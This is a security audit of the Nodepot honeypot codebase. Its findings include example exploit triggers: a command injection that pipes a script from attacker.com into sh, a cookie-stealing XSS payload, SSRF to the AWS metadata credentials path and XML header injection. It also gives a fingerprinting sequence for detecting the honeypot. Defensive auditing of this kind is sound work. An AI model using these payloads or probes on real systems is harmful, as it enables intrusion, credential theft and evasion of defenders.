# Nodepot — Security Analysis

**Repo:** https://github.com/schmalle/Nodepot  
**Type:** Node.js WordPress honeypot — emulates WP login/xmlrpc/plugin paths, logs RFI/LFI/XSS attacks, fetches dropped payloads via curl, reports to EWS/hpfeeds/Twitter  
**Lanes:** 3 (server/routing/rules · database/downloader/analyzer · mailer/reporter/Twitter/Docker)

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 4 |
| HIGH | 16 |
| MEDIUM | 10 |
| LOW | 8 |

Nodepot has two independent pre-auth RCE paths: command injection via unsanitized curl execution of attacker-supplied URLs, and `eval()` in the service start script. The payload downloader — the honeypot's primary intelligence-gathering mechanism — is the attack surface. SMTP credentials and Twitter OAuth tokens are hardcoded in committed source files. The Docker base image (Ubuntu 14.04, EOL April 2019) has had no security patches for 7+ years.

---

## CRITICAL

### C1 — downloader.js:44-45 — Command injection via curl; pre-auth RCE on the honeypot host

```javascript
function downloadStep2(url, dest, cb) {
    console.log("curl -o " + dest + " " + url);
    executer("curl -o " + dest + " " + url);
}
```

`url` originates directly from the attacker's query string (extracted by `fixExternalURL()`, lowercased, never shell-escaped). `dest` is constructed as `downloadPath + sha1(url) + "_" + rawFilename` where `rawFilename` is the last path segment of the attacker URL with no sanitization. Both are concatenated into a shell command executed via `child_process.exec`. The only guard (`dest.indexOf('..')`) does not block shell metacharacters.

**Trigger:** `GET /?page=http://evil.com/$(curl http://attacker.com/reverse.sh|sh)` — backtick/`$()` execute during shell expansion. Also: `GET /?file=http://evil.com/shell;id>/tmp/pwned`.  
**Impact:** Unauthenticated OS code execution as the Node.js process user. Confirmed independently by both Lane 1 and Lane 2 analysis.

---

### C2 — mailer.js:7-11 — Hardcoded SMTP credentials committed to repository

```javascript
user: "username",
password: "password",
host: "smtp.gmail.com",
```

Placeholder credentials committed to version control. If any real credentials were ever substituted and committed (the template implies they would be), they are permanently in git history regardless of any subsequent overwrite. The recipient email addresses are also hardcoded in the same file.

**Impact:** SMTP credential extraction from any repository clone; email account compromise; operator identity disclosure.

---

### C3 — docker/Dockerfile:1 — Ubuntu 14.04 EOL base image; no security patches since April 2019

```dockerfile
FROM ubuntu:14.04.2
```

Ubuntu 14.04 reached end-of-life April 2019 — seven years of unpatched glibc, OpenSSL, kernel modules, and system libraries. Any vulnerability discovered in that window against packages shipped with this image is exploitable in all Nodepot Docker deployments. No patch path exists.

---

### C4 — nodepot.sh:6 — `eval` of unquoted variable enables shell injection

```bash
number=$(eval $cmdLine)
```

`cmdLine` is set to `/opt/Nodepot/corecheck.sh` on line 4. `eval` executes the unquoted variable. If `/opt/Nodepot/corecheck.sh` is world-writable (common in default Docker deployment without explicit permissions), or if `cmdLine` is overridden via environment variable injection in a CI/CD or orchestration context, `eval` executes arbitrary shell commands as the invoking user. `$()` subshell suffices here — `eval` is unnecessary.

---

## HIGH

### H1 — analyzer.js:272 + downloader.js:45 — SSRF to internal network and cloud metadata via curl

Every GET parameter containing `http://` triggers a curl fetch with no destination restriction. No allowlist, no RFC-1918 exclusion, no loopback block, no scheme restriction.

**Trigger:** `GET /?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/`  
Honeypot fetches AWS IMDS, stores response in `downloads/` at a predictable path. `GET /?page=http://10.0.0.1/admin` probes internal networks.  
**Note:** Downloads directory may be web-accessible, allowing the attacker to retrieve the response in a second request.

---

### H2 — analyzer.js:123,244 — https:// RFI completely bypasses all detection

```javascript
var externalReference = (S(query).contains("http://"));  // line 123
if(query.indexOf("http://", runner) > -1)                 // line 244
```

Both the detection trigger and the download loop only match `http://`. Modern RFI campaigns use `https://`. A payload like `GET /?mosConfig_absolute_path=https://evil.com/shell.php` sets `externalReference = false`, skips `URLNotExists` logging, skips Redis storage, skips EWS reporting, and skips the download entirely. Systematic detection gap for all HTTPS-hosted payloads.

---

### H3 — servercore.js:77-82 — Stored XSS in admin panel via raw log injection

```javascript
var learnedStuff = fs.readFileSync(logPath, 'utf8');
response.write(learnedStuff);
```

The raw log file is injected between HTML wrappers without entity encoding. `analyzer.js:121` logs the full request URL verbatim. An attacker sends:

`GET /?x=<script>fetch('https://attacker.com?c='+document.cookie)</script>`

This lands in `nodepot.log`. Next admin panel load executes the XSS in the operator's browser — session hijack, CSRF pivot, credential theft from the admin session.

---

### H4 — db.js:99-119 + servercore.js:95 — Stored XSS in dork.html served to all visitors

Every new attack URL is written raw to `html/dork.html` without encoding. `servercore.js:95` serves this file to every visitor. An attacker sends `GET /?<img src=x onerror=alert(1)>=1`, the payload lands in `dork.html`, and executes in every subsequent visitor's browser.

---

### H5 — analyzer.js:100-109 — X-Forwarded-For accepted verbatim; log injection + attribution spoofing

```javascript
if (config.use_forwarded_for != undefined && config.use_forwarded_for)
{
    attackerIP = request.headers[item];  // raw value, no validation
}
```

`use_forwarded_for = true` in the template config (the as-shipped default). Header value concatenated into log output and EWS reports without stripping newlines. An attacker injects fake log lines: `X-Forwarded-For: 1.2.3.4\n[2026-01-01] FAKE ADMIN LOGIN FROM 192.168.1.1` forges entries indistinguishable from real records.

---

### H6 — analyzer.js:186-198,207-221 — Rule engine double-increment skips 50% of attack pattern matching

```javascript
for(var i=0; i<rules.attackStrings.length; i++) {
    if (S(url).contains(rules.attackStrings[i]))
        return rules.attackStrings[i++];  // post-increment after match
    i++;                                  // unconditional increment
}
```

Effective checked indices: 0, 2, 4, 6, 8 ... — every even index. Same bug in `checkHeaders()`: only checks `"user-agent"`, `"host"`, `"content-type:"` — never `"User-Agent"`, `"Host"`, `"Content-type:"`. Half the rule set never fires. The return value `attackStrings[i]` is the raw pattern string (200+ chars), not the label — all log entries and EWS reports contain the raw attack string instead of a meaningful label.

---

### H7 — reporter.js:23-26 — Template chain bug; MY_IP never substituted in outbound EWS reports

```javascript
var stage7 = S(stage6).replaceAll('MY_IP', config.my_ip).s    // computed
var stage8 = S(stage6).replaceAll('RDATA', rawData).s          // branches from stage6
PostCode(stage8, ...);  // stage7 discarded, MY_IP placeholder sent verbatim
```

`stage8` branches from `stage6` independently; `stage7`'s MY_IP substitution is discarded. Every outbound EWS report contains the literal string `MY_IP` in the `<Target>` field. The reporter has been silently broken since initial commit — all production reports are malformed XML.

---

### H8 — twitter.js:21 — Attacker controls tweet body via X-Forwarded-For injection

```javascript
T.post('statuses/update', { status: message }, ...);
```

`message` includes the attacker IP from `analyzer.js`. `use_forwarded_for = true` means the IP comes from the `X-Forwarded-For` header — attacker-controlled up to 280 characters. An attacker can publish arbitrary content to the operator's Twitter account: spam, links, mentions, targeted harassment, or honeypot self-identification.

---

### H9 — twitter.js:7-12 — Twitter OAuth credentials instantiated even when feature is disabled

```javascript
var T = new Twit({ consumer_key: config.twitter.api_key, ... });  // line 7-12
if (config.twitter.use == "yes") { ... }                           // line 16
```

Twit constructor runs unconditionally at module load time. OAuth credentials are in the heap and loaded from config regardless of the `use` flag. Any process with heap read access (via `/proc/<pid>/mem`, OOM dump, or debug interface) extracts live OAuth tokens even from "disabled" installations.

---

### H10 — template/report.txt:9 — XML injection via ATTACKER_IP; forged EWS report structure

```xml
<Source category="ipv4" port="" protocol="tcp">ATTACKER_IP</Source>
```

`ATTACKER_IP` is inserted without XML-encoding. An attacker sends:
```
X-Forwarded-For: 1.2.3.4</Source><injected xmlns="http://schemas.xmlsoap.org/soap/envelope/"/>
```

This injects arbitrary XML nodes into every outbound EWS alert, corrupting downstream SIEM parsing, forging classification metadata, or breaking the SOAP envelope.

---

### H11 — docker/Dockerfile:14 — Image built from HEAD with no pinned commit; supply chain attack surface

```dockerfile
RUN cd /opt && /usr/bin/git clone https://github.com/schmalle/Nodepot.git
```

Always pulls HEAD at build time. No commit hash pinned. A compromise of the upstream GitHub repository propagates to all newly built images. No integrity verification possible after the fact.

---

### H12 — docker/Dockerfile:3-10 — All npm and OS packages unpinned; supply chain

All `apt-get install` and `npm install` lines have no version pins. `package.json` uses `"*"` wildcard for several packages. Any malicious publish to npm (takeover, typosquatting) installs automatically in fresh builds. `emailjs@0.3.15` and `nodemailer@1.3.4` are circa-2014 packages with known vulnerabilities.

---

### H13 — docker/nodepotstartconfig.sh:9 — Path traversal via unquoted config path argument

```bash
nodejs app.js $1
```

`$1` is the config file path taken from a positional parameter, unquoted. If called from a higher-level orchestrator with user-influenced input, an attacker provides `../../etc/passwd` as the config path. Node.js `require()` attempts to load and parse it as JavaScript — syntax error in most cases, but on specific inputs may execute partial content.

---

### H14 — docker/Dockerfile:17 — Default hpfeeds config shipped in Docker image; data exfiltrated on first boot

```dockerfile
RUN cp /opt/Nodepot/template/config.js /etc/nodepot/config.js
```

Template config has `hpfeeds.use = "yes"`, `ident = "test"`, `secret = "test"`, `server = "hpfeeds.honeycloud.net"`. Out-of-box Docker deployments immediately send all captured attack data to hpfeeds.honeycloud.net using hardcoded test credentials, visible to any subscriber on the `test` channel. Operator's intelligence is exfiltrated before any configuration step.

---

### H15 — docker/supervisord.conf:5 — Redis on 0.0.0.0 with no auth or bind restriction

```conf
command=/usr/bin/redis-server
```

No `--bind 127.0.0.1`, no `--requirepass`. Redis in older default configurations binds `0.0.0.0`. Any container sharing the network namespace or any sidecar service can read/write all attack data in Redis. Redis `CONFIG SET dir` + `CONFIG SET dbfilename` enables arbitrary file write on the host filesystem.

---

### H16 — docker/Dockerfile — No USER directive; all processes run as root

`supervisord`, `redis-server`, and `nodejs` all run as UID 0. Any RCE path (C1) executes as container root. Container escape yields root on the host with no privilege escalation step.

---

## MEDIUM

- **analyzer.js:114,124** — Single `unescape()` pass; double-encoded payloads (`%252e%252e`) bypass traversal and XSS detection filters.
- **analyzer.js:315-316** — `String.prototype.substr(start, length)` called with absolute index as second arg; malformed URLs passed to curl.
- **db.js:111-119** — TOCTOU race: synchronous `unlinkSync` followed by async `createWriteStream` on `dork.html`; concurrent requests get ENOENT or interleaved writes.
- **analyzer.js:125** — XSS detection only matches `alert(`; `<script src=`, `onerror=`, `javascript:`, `svg onload=`, etc. all pass undetected.
- **dbcore.js:7-24** — Always takes OpenShift Redis branch due to `|| "127.0.0.1"` fallback; `client.auth(undefined)` sends string `"undefined"` as Redis password on non-OpenShift deployments.
- **analyzer.js:136** — CRLF in URL (`%0d%0a`) injects fake log lines; since admin panel serves raw log, this is a second path to H3.
- **template/config.js:60-64** — `hpfeeds.secret = "test"`, `hpfeeds.ident = "test"` default; shared credentials expose any non-Docker deployment's data on the public hpfeeds channel.
- **reporter.js:17-18** — EWS credentials (`xxx`/`yyy`) substituted raw into XML body; special chars (`<`, `&`) corrupt XML structure.
- **corecheck.sh:2** — `grep nodejs | wc -l` includes the grep process itself; count off by one; service restart logic fires wrong branch (may restart running service or not restart downed service).
- **docker/Docker.txt:31-35** — Developer's real Mac username (`/Users/markus/`) and directory structure committed as documented run commands; host filesystem layout and username disclosed.

---

## LOW

- **template/report.txt:13** — `<Classification text="ModSecurity"/>` — all EWS reports falsely claim ModSecurity as the detection source; honeypot identity exposed in outbound telemetry; downstream threat intel records are false attributions.
- **analyzer.js:151** — `new Buffer(buffer)` deprecated since Node.js 6, removed in Node.js 10+; throws on modern Node, silently breaking EWS reporting on every attack event.
- **template/config.js:45-51** — Hardcoded absolute paths (`/opt/Nodepot/html`, `/opt/nodepot/downloads/`, `/etc/nodepot/config`) in any stack trace or verbose log expose deployment layout.
- **package.json** — `"twit": "^1.1.20"` targets Twitter API v1.1 which was sunset; Twitter integration non-functional on any fresh install.
- **test/reportertest.js:8** — Test call has 10 args; `reporter.js:13` expects 12; `rawData` and `config` are `undefined`; the reporter is never actually tested.
- **test/twittertest.js:3** — `t.tweet("test nodepotms, pls ignore")` called with no config argument; `TypeError` in twitter.js:16 means Twitter integration has never been exercised in test.
- **docker/nodepotstart.sh:7** — `redis-server &` with no error trapping; if Redis fails to start, nodejs starts and logs nothing silently.
- **servercore.js:73** — `config.home_ip = "192.168.178"` is a prefix substring match; any IP in `192.168.178.0/24` passes the admin auth check (254 hosts, not 1).

---

## Fingerprint Table

| Signal | Detection | Confidence |
|--------|-----------|------------|
| `HTTP 200` on every path including `/definitely-404-path` | Two-request probe | Very High |
| `dork.html` body: contains `startLobby.php`, 500+ attack strings | `GET /dork.html` | Definitive |
| `<html lang="bee">` present in all admin responses | HTML parse | Definitive (if same codebase as express-honeypot) |
| Port 8889 serving HTTP claiming to be WordPress | Port + behavior | Very High |
| `Server: not reported` + no `X-Powered-By: PHP` + no `Set-Cookie: wordpress_*` | Header absence | High |
| TCP/10000 outbound to `hpfeeds.honeycloud.net` | Egress monitoring | Definitive |
| `User-Agent: curl/X.Y.Z` outbound to attacker C2 on payload fetch | C2 server log | Definitive — discloses honeypot identity at C2 contact |
| `<a class="navbar-brand">Nodepot Admin UI</a>` in admin HTML | `GET /admin` | Definitive |
| Bootstrap 3.1.1 from `netdna.bootstrapcdn.com` + jQuery 1.11.0 from `ajax.googleapis.com` | CDN paths in HTML | High |
| Redis on port 6379 co-located with Node.js on a "WordPress" host | Process/port scan | High |

**Minimum detection sequence:**
1. `GET /anything HTTP/1.1` → HTTP 200 always → candidate
2. `GET /dork.html HTTP/1.1` → 500+ attack strings → confirmed Nodepot
